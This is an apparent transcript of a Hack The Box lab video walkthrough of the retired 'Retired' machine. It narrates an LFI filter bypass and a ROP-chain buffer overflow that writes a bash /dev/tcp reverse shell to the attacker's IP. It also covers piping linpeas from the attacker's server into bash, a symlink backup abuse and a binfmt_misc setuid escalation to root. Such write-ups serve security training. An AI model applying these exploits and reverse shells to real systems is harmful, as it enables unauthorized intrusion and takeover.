 what's going on youtube this is ipsec we're doing retired from hack the box which starts out like a lot of the other binary exploit machines you have a web server that's vulnerable to lfi so you can leak the vulnerable application along with the memory maps of it libsy version things like that where this differs is the vulnerable application is a license activator that listens on localhost and the web application sends it a file and that's where the buffer overflow is in most the buffer overflows that we've done you have a direct network connection to it so you can just have prone tools connect to it do a socket reuse attack so you get a shell in that existing network connection and this you can't do that so you either have to disable depth through some m protect calls and then put some reverse shell code on it or you can create a rock chain and write a string into memory and then have system execute that string the rock chain method is the one we're going to go to and then once you get a shell in the system there's a few other things you have to do to privesque but i won't spoil that let's just jump in as always let's start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it retired and then the ip address of 1010 11.154 this can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and it's banner says debian 5 which i think is old i'm not exactly positive but um i may try some older exploits like shell shock things like that if i see an old operating system we see http on port 80 it's running engine x and oddly enough it's not giving us any type of banner so we can't use nginx in combination with ssh just to identify if the whole web server is out of date um it is doing something odd saying index.php question mark page is equal to default.html so let's go take a look at the web service so 10 10 11 154 and whenever i see this page parameter i'm going to assume it is going to be vulnerable to an lfi the very first thing though i want to test is just to make sure default html is in my current working directory so if i do default html i get a page oddly enough i did not expect to see this whole header and the footer as well because generally the whole reason for this is it's like some do-it-yourself bad templating engine because this index.php is going to include a file normally called like header.html then it's going to include whatever the user puts and then probably footer.html and the whole reason they do that is so they can have one file where they can edit the top of the page where like links would go so if someone added a purchase link right now because everything's just in one each like these html files you have to go edit each html file to add that purchase link however if it's some type of templating language they just add it to the header and then because index is saying okay i'm going to get header then i'm going to go for the user supplied one which is default then further you don't have to modify it in every page because it's just included everywhere so we're going to look at the lfi in a minute but because you can't hack time i always like just doing like a durbust right off the bat so i'm going to do a gobuster dir u http 101011 151 w for word list opt set list discovery um where is it web content then raft small words dot text extensions i see php and html so i put them both there and then out i'm just gonna do go buster.out and the whole reason i want to start this mainly before i do anything and 154 is the ip address is once i have this lfi there may be other files i want to get like maybe there's a config.php things like that so having the stir buster will tell me in the background while we take a look at this so the first thing i do a bunch of dot slashes for index dot um etsy wd and we see we just get directed back to the page now um the browser can do weird things with urls and things like that um normally it doesn't happen on this uh parameter but like if i did a bunch of things here it like automatically converts it for me like does all the dot dot slashes um so i like sending things to burp suite so i'm going to clear that and then we're going to get let's go back turn intercept on i'm just going to intercept this so we can see the request and did not expect to see that so we have lfi right off the bat um this is an execute after read vulnerability most likely because we see this location there shouldn't be anything in the body but because the web developer probably didn't put a die statement in after they set the redirect it just kept on continuing down the script and we got this so let's go take a look at index.php so i'm just going to and look at index.php and there's two things putting index.php here is going to do for me number one if i see um actual code then i know this is using probably file get contents because um it should execute php if it's an include or something like that so this kind of tells me on the back end is this going to be an include if it executes code then i just have to put php code somewhere on the web server i can code execution that way we get a blank page if i do control u to view source because the browser is going to hide things between the like angle brackets or whatever those are we get something so let's see here um we define a function and glancing at this function first um this sdr replace is not a recursive thing so we'll talk about that in a minute but i want to go into that execute after read vulnerability because we get to this code where it says the redirect and then they don't have a die after this so since they don't have a die we go to back to read file and because oh um our response didn't begin with a character a to z so we didn't even hit the sanitize input function that's vulnerable so um let's go take a look at this and talk about why that not being recursive is a bad thing so it's using sql replace so i'm gonna do echo str replace and i'm gonna replace the word please with nothing and the phrase i want is please subscribe so we can see the please gets replaced in this please subscribe and if i do please please it erases both of these because this just goes left to right when it's like looking for please and it removes it and then just picks up right off the bat removes it again but when it does this it doesn't go back to the beginning so if we did a please in the middle of a please like this we could please subscribe because the script's looking for please it starts here ple doesn't see it because the next one's please sees this removes it and it keeps going and that leaves the whole please subscribe so let's go back and take this function from the web app and experiment with this so we can just do echo sanitize input and it's filtering dot dot slashes right so if i do this i need a semicolon we see it filters this so if we do what we did with the please subscribe and put a dot dot slash in a dot dot slashes so when it removes this dot dot slash the other dot dot slash remains we just get dot dot dot because the next thing it's removing is this dot slash so we want to add another dot slash and what this is going to do is we have let's just copy this real quick uh copy paste there we go so the first function removes dot dot slash and then the second piece removes dot slash and then we're just left with dot dot slash so i bet if we copy this and then go to a browser we got default.html because you got to remember we began with a period so we hit that regex right there so let's put an a here and then it's normally ver www.html so we probably have to put another dot dot slash so we go up four directories hit enter and we don't get it um let's try one more there we go so i was at the wrong number of directories but there we have it we got etsy passwd this way so now that we have this lfi and looking at index.php it is read file so it's not going to execute code all we can do is leak information so let's go back to our door buster and the only other thing we have is beta.html so let's take a look at what beta.html is we have this beta testing program a browse and submit so let's take a look at what this does so hdb um retired we'll just upload a go buster.out file and turn intercept on submit it we're getting activate license.php so we want to grab this source code and this is the contents of what i'm sending i was like oh we got something but no it responds with nothing so let's take a look at this source code so page activate license.php [Music] okay so the very first line is it's just checking if it's like an http upload with this is files things and we can see that right here it is a file the file name is gobuster.out that we uploaded and then it's going to do a file get contents on the temporary file that's created by this upload and then it's going to check the license size so how big this is and we're not running it to a file we actually create a socket and connect to 127.001 portly so the very first thing i want to do is check if this port is open to us so 101011 154 port 1337 connection refused so this is only listening on localhost and then we're going to write the license size and then the license and then shut down the socket um let's see what this pack is it's probably like a big small endian thing or something like that so php pack let's look at this function and see what capital n is so that's lowercase n it's unsigned long so um yeah so it just writes the size and then gets the file so what we want to do is see what is listening on this port lead so i think we can do that through um the proc table so is it proc net and then what is it tcp if i cap this i want to say we'll be able to let's take a look at it so let's go to the page and we have to do what is it one two we have it in our burp suite right is it one no we don't so i think it's five and three okay let's make sure we get past wd 302 found that's not it let's see we take out dot slash hold on so take that out then we take a dot slash out that should be it let's see do i have it saved anywhere there it is oh i forgot to put the a at the beginning i always forget that one let's do proc net tcp and we have a few things so see this does not tell me the pid i believe though i was hoping this would tell me the pid but it doesn't i want to say this and hex is leap no um what is lead so decimal to hex 1337 539 it is so i was right the first time so this is the thing listening and i could have swore there would be a pid for this but not so i'm gonna go to my other favorite file which is schedule or sked underscore debug and proc and we're going to look at the running processes or services on this box and i see one right here activate license and considering this whole code is doing a license thing i'm going to assume this is the right binary and it's 452 so what i want to do is copy this we're going to go to proc 452 then cwd and this should put us in the activate license directory and we should be able to download it uh maybe not let's see cmd line it's user bin activate license so we can download it this way so let's curl this file okay so now we have activate license so chmod plus x activate license and if we execute it we need a port i'm going to put leap and the server is started so let's create let's send it a bunch of a's so i'm going to do python 3 c print a times um does it give us any information about what the license is let's see a license file contains a 512-bit key so i'm going to do 756 bit higher than that so if it's creating a buffer of 512 we should overflow that so now that we have all those a's we should be able to just netcat localhost 1337 and then send them and it activated the license and it's reading a lot of bytes i bet if we change the first character we can change the number this is and i'm thinking that because of the code see i think i did here of the very first thing being how big the license is so i wonder if i connect again it works so the very first thing i'm going to send i'll do one right and it's reading 808 bytes if i do o1 again it's doing the same thing if i do o it's still this 808 so it's only worried about this very first character if i do 10 we see we have changed the number of bytes because this is the i think the unsigned long 32-bit integer right so if we want to actually write something there we can use printf so if i do printf0x00 like this it's gonna look like we didn't print anything so if i do x uh xxd to hex edit we can see i just wrote all null bytes to the screen so i'm going to do one and then we can do ipsec after this right so nc localhost 1337. and we see something interesting it only read one byte but the connection was reset by the pier that never happened before so if i go back to how i did or if we just look up i guess when we did the ace i had to control see it and never reset my connection and that's probably because we filled up this whole buffer right when i did all those capital a's i'm gonna guess that we didn't send enough characters where it actually read everything right so if i do ipsec is six characters right we go like this nc localhost elite see activated license ipsec and it was actually graceful if i do 5 we get connection reset so if we start sending characters after the size it fails so maybe this is going to be some type of buffer overflow and because this program isn't crashing i'm going to assume it's opening up threads and doing something like that so what if i do let's do zoa real quick 10 bytes and it just says activated license so let's open this up in a debugger so i'm going to do gdb dot slash activate license let's do a dash q for quiet i'm going to set the follow mode what is it um set um follow fork mode to be child because i know this program is forking probably once we connect so i want to tell gdb to follow that and we can run on port lee and let's just send it the zero one then ipsec where the server was um closing their connection on us and we did not get a crash if i try to run import lead again the address is in use because we're in the child so i'm going to run import 1338 and then let's set this hex to 400 which i want to say is 1024 and i'm going to go back to my a's i'm going to grab all these um shoot let's just open a new thing python3 dash c print a times uh we did 756. let's see what happens here okay so we're going to tell the server we're sending 512 i think bits of data or maybe bytes and then send it 756 and it just activated the license so it read 10 24 bytes and was like that's perfectly fine so oh i probably did not follow fork mode let's quit out of this real quick ps ef activate i just want to kill all the processes um awk print two zergs kill dash nine there we go so we wanna set follow fork mode to be child run on port elite oh i didn't go i was listening on or doing one three three eight up here and i sent back to one three three seven and we get a crash here so we have successfully found a buffer overflow in this program now the next step here we have to um create a pattern so we can find out exactly where we overwrote um the rsp and every time i crash the program i'm going to rerun my kill command to kill the parent and then we start it back up so we want to set the follow fork mode then run on portly oh before we run we should do pattern create and then what we did 756 or something so we can grab this pattern and then we can run on port elite and then what we want to do is the printf again and what we did 1024 in hex and paste this that should be good there we go so now we want to do um xxg to examine the rsp register which is going to be the pattern we can do pattern offset this and we find it at 520. so i'm going to call this exploit.pi i'm going to do from pawn import star and we'll call this um we'll call it offset is equal to 520 and this is an rsp overwrite so the next thing we will need to do is get memory regions of this we can assume aslr is probably going to be running maybe it's not because it's such an old system but because we have this lfi we can extract all the memory addresses anyways so where's activate license that's 452. so if we do proc 452 map or is it maps we get everything we need or most of the things we need so this can be the base address the very first of a binary so we'll call this base then the next thing we need is libsy so that's right here make sure yep oh god i copied the whole thing there we go and these are from proc maps or proc self maps or 452 and then the next thing we'll want to grab is the actual libsy that is running so we can just easily download it with our curl command i don't know where i was doing that maybe here curl so let's paste and then do dash o lib c dash 2.31.sl and then with libsy we want to find the location of a system call so we'll use find a call to system and we can use object dump for that and then just grep for system and we want this address so we can say libsy system is equal to this object dump dash d and then what we're going to do here is a little bit different most of the times when we did this type of buffer overflow we could connect to the network port directly so we could do like dupe 2 calls to overwrite the standard in and out sockets onto the network socket and just drop into a shell however we're uploading a file and then executing it so we have to get it to send us a shell back because there's no network connection we can just reuse so because of that we're going to write a string in memory and then use this system to execute it with the dupe 2 we normally don't have to write a string in memory because lib c itself has a string been bash in it or bin sh we can just system to that and because we're reusing the network socket we can call system with bin sh and get a shell however we need to send it a reverse shell payload so like bash c bash dash i dev tcp all that jazz and we're not going to find that string in the binary so we're going to write it ourselves so to do that we're going to use um the rdi register and the rdx register and then we're going to do a bunch of move commands to copy it over in so um i'm going to use wrapper and we do dash f for file lib c and the first we want to look for is a pop rdi then return [Music] oh we need search and all the gadgets we need should be in libsy so here it is so this is gonna be pop rdi then the next one we want is a pop um what is it rdx we could probably use a lot of different registers for this but these are the most common rdx is here and then this next one we want to be able to move data that is nrdx 2 rdi so what i'm going to do is move rdi rdx and see if it exists in here see this looks good three ace five so copy this uh rdx rdi let's just call this move there we go so we got our gadgets so let's see we have the base addresses so this is where the binary exists this is where lib c exists and because we know where libsy exists we can find where the system and all these gadgets live these gadgets actually have to be p64 libsy system plus there we go so now that's where that is we should do that here so all those locations are correct and the last thing we need to do is just find a writable space in memory so we're going to use the actual activate license binary for this so i'm going to do read elf dash capital s activate license and we can look for right access bases we should be able to use a lot of these but i'm going to specifically choose data which is 4 000 above the base of this we could have also done read alph then dash x.data and then got 4000 here but we're just going to write to that section of memory so writable is going to be um p64 base plus 0x 4000 okay so now we just need to create our reverse shell i'm going to do everything in binary coding so that's what the b is bash g bash dash i dev tcp 10 10 14 8 9001 like that and then we have to create the start of our buffer overflow so we're going to do rop is equal to b we'll do a times offset which was 520. so this gets us to the rsp overwrite so for i and range 0 the length of our command and then a step of eight so this is going to count in eights so the first one is going to be uh zero then seven then whatever right we're counting in steps of eight instead of one because they're writing eight bytes at a time so first thing we want to do is put something in rdi that thing we want to put in is going to be the location of where we're writing to so writable plus i then we do an rdx pop underscore rdx and what we put here is going to be the eight characters from our shell so plus equals cmd i i plus eight and then we want to l adjust it eight and pad that with null bytes and the reason we're doing that is because let's say um this the very last byte right here we're going to write like zero zero zero um then this so what this is going to do is just always um keep our string and lengths of eight and after that we want to do the move command so keep in mind that move let's see where is it oh it's down here um we're taking what's in rdx so it's going to be eight characters from a shell and then moving it to um where rdi is pointing to so that's gonna be a writable space in memory and it's going by eight so we take this write it to four thousand the next one we write it to four thousand eight or maybe four thousand seven or something like that and we just keep going down right or up so now that we have our um [Music] reverse shell in memory we want to [Music] um do our assistant command so we're going to pop rdi again and this time we're going to put the address of where we wrote to and then we call system libsy system and now we have a rock chain so again we write to memory we put the location where we wrote to into rdi then call system which pulls this string from rdi which is this so with open we'll call this license.key write binary as file f dot right rob and then when we run this libsy system is not defined libsy system oh um lipsy bass so base right here six bass bass base there we go can't concat it to bites where is writable oh we're packing it down there so i don't need to pack it up here what i meant what i said by that is we had writable pact and then in here we are packing it yet again so we didn't want to do that there we go so now we have license.key so i'm going to listen on port 9001 and we're going to submit license.key to the application let's refresh to make sure we have something license.key submit and we gotta show very first time we got it working so um let's export um or let's see python 3 c import pty pty dot spawn then bash and then sd2y dash a um let's do st2y raw minus echo fg then x or stty rows 26 calls 105. export term is equal to x term and now i can clear the screen and we have a proper shell awesome the first thing i always do is take a look at the web directory server dub uh then html we can see some odd things we got these zips but if we go to html we don't see any files that we were missing so i was looking for like some type of config file or something like that but we don't have anything um if we do unzip dash l we can i think the list the contents i think that's what dash l is doing uh dash one two like this and this looks like it's just a zip of the web directory so let's run lin p's real quick so the very first thing i'm going to do is download it so lynn p's github go here psng go to releases and download the sh script make dirt dub dub dub w get this python3-m http server we can close this pane we don't need it then curl 10 10 14 8 8 000 linps.sh and pipe it over to bash uh we can w get it i guess okay then let's just execute lin peace so i'm going to pause the video let this run and we'll take a look at when it's done now that it's done we can go back to the top and see [Music] what is there so it says it's vulnerable to two different cves so we can take a look at what these are so you look at this this is um poliket and then this one see it's a debian one or if there's a poc for this looks like there is so copy it back and then run it so we can see if this works see we just need exploit.c let's see and the intended way for this is not a um privacy like this but i'm gonna see if this works do we have gcc we do so v exploit.c paste it gcc dash o exploit exploit.c right that's what it wanted me to do did have instructions i don't see anything gcc yep we did right so let's copy passwd back i'm going to md5 some etsy pass the review real quick so we can see if we ever change it run this um oh we called it exploit chmod plus x exploit like that says it worked s u roots md5 sum etsy passwd does not look like it worked the file has not changed and root is still root so i don't believe this one works so let's go back to lynnps.sh go to the top and we'll go through everything else so i'm just looking for things that are highlighted we have linps highlighted in the process list nothing too interesting uh the cron i want to take special look at because we had the um files and verb dub dub dub there's zips and i don't see anything there and we have something odd um a system timer which is like a kron4 service it's a website backup service it's got 31 seconds left so it looks like it runs every minute so if we do system ctl cat website backup service we can see it runs as the user dev and executes user bin web backup so if we look at this file it's just a bash script we don't have vim so we can just less it and see what it does so we go in verb dub dub dub source destination and it's going to zip recursive paths and i believe this is going to be vulnerable to assembling vulnerability because we can create a sim link inside of um [Music] verb dub dub html to point to dev's home directory and then when dev comes and zips it he's going to zip up the sim link it's going to follow it to his home directory and then he'll zip up those content so let's try that real quick so we do ln s and i want to say we type anything we want here and then the location um maybe we do it the other way like that if i do ls-la we can see dev is pointed to home dev and all we want to do is now wait for a new file to be written so that's let's see how is this writing let's do lsla so 27 uh we can do unzip dash l and look at this oh uh dub dub dev activate license set it i believe so because we have dot profile and bash log out so let's put this in temp and then turdatar unzip this file and inside attempt we have ver www.html and then go into dev and now we're in his home directory um first things first let's look at ssh we do have an authorized key file so we should be able to use this key to ssh into him so v dev dot id rsa paste this chmod 600 sh-i dev and then dev at 10 10 11 154 i think it's the ip uh invalid format that's the public key i copied uh we want id underscore rsa this is it copy paste i don't know if we want a line break or not so if this fails i'll probably delete that line but it doesn't and now we're logged in as dev the first thing that sticks out was that em emu emu directory so if we go into this we do have a readme i gotta remember vim was not installed and it's a emulator for the handheld console ostrich and it says after running make install asteroid drums can simply be executed from the terminal for example the rom named rom can be executed with dot slash rom so let's take a look at the file so i do have vim i just vim.tiny so we can look at emu emu.c and of course we don't have highlighting so it does nothing if we look at reghelper.c we can see it's opening proxis fs bin fmt misc register and then writing to it so um let's take a look at exactly what this is so if we copy we can paste to go to google and we have kernel support for miscellaneous binary formats and the helpful thing here is the examples so what it's doing here is we can look at this enable support for windows executables with wine if we write dos when then m and based upon this mz i know this is the magic byte for an exe so this m it probably means magic bytes if we go up here we can see name type so m is for magic e is for extension so in their example they're saying the magic bytes mz then execute the file with user local bin wine now the one interesting thing about this is the credentials currently the behavior of bin fmt miscellaneous is to calculate credential security token of the new process according to the interpreter so if we had the interpreter be a set uid binary the credentials will follow it right so we just have to figure out how it writes into this directory because this is a privileged thing only root can so let's look at how it installs so they have this make file and we can see um maker parent it's making user lib emu and we're setting the capability dac override and if we look at this capability if i just go copy google the capability see i'm just gonna google hack tricks because i like how they explain things here we go so capdak override see where is it here we go you can bypass write permission checks on any file so it's giving the reg helper the ability to bypass any type of right check and writing to a privileged place so if we do a get cap on this not found uh user s been get cap we can see it indeed does have this so if we execute it uh let's see how do we how is it taking files in we should go back to reg helper dot c see read standard n file now so i think it's reading from just standard in so the next thing we need to do is create a syntax for this so we do name type offset they kind of do it all for us so the name this is just going to organize it so i'm going to call it privesque and then the type we want to be e for extension then after that i don't think we have an offset so whoops i'm just going to delete offset the magic this is going to be what we want the extension to be i'm going to call it ip so if we have a dot ip file it will private for us mask i don't think we have so we're gonna get rid of this the interpreter we we're gonna have to create this this is gonna be the file that it executes so we will do um temp uh shell we'll call it shell and then flags we want c so if we echo this into user lib emu reg helper then we have to go into temp v shell.c uh we just have to create a quick program that does a set uid oh god i have no clue what my computer started doing there so we can do set uid 0 then set gid 0. and then we just want to call system bin bash and then close out the things i don't think we need a library dasho shell okay so we have shell the next thing we need to do is um find a set uid binary so find slash dash perm i think dash 4000 like that to devnl so you should be able to use any of these binaries um let's just take fuser mount so let's do ln s this and then we'll call this dot ip and then if i execute this it should now um use the slash temp slash shell to execute this program and temp shell doesn't do anything with the program it just returns a shell so there we have it id is root so i can go into slash root now and we could cat root.txt if we wanted to so um if you're confused it's using this credentials so the credentials takes the credential with the binary you want to execute so the f user amount this had the set uid credential with it we checked out with the bits if i do lslu or la on what was it user bin fuser mount we can see it has set uid privilege so that's why our binary got it because with the one echo let's see where was that it's probably not in this shell exit so we took anything with the dot ipp extension and then passed it over to tap shell first so it took f user's credential gave it to temp shell and tamshell gave us a shell so hope you guys enjoyed that video take care and i will see you all next week